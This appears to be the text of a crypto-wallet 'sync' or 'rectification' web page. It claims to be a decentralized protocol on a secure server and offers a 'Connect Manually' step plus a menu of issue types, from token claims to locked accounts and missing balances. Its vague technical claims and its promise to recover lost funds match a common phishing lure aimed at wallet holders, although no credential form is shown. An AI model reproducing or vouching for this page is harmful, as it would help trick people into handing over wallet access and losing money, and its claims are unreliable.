Decentralized Protocol

Decentralized protocol for syncing various Wallets issues on Secure Server.

This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet.

Connect Manually

Select Sync Type

Choose the type of issue you're experiencing to get the right assistance

🔄

Migration

Click here for migration or anything related to migration

🎁

Claim Token

Click here to claim tokens or have issues claiming tokens

🔧

Resolve RPC Error

Click here to resolve RPC error or any RPC related issues

⛽

Resolve High Gas Bug

Click here for High gas or transaction fee related issues

📉

Slippage Error

Click here for all issues related to slippage Error

✅

Rectification

Click here to rectify any issue related to your wallet

🔄

Swapping Error

Click here for token swapping related issues

💰

Staking

Click here for token staking/unstake related issues

🔒

Locked Account

Click here if your account was locked or wallet stuck

💸

Missing/Irregular Balance

Click here to recover your lost or missing funds

⏱️

Transaction Delay

Click here for any transaction error or delayed transactions

🐛

Wallet Glitch

Click here if you have problem with your trading wallet
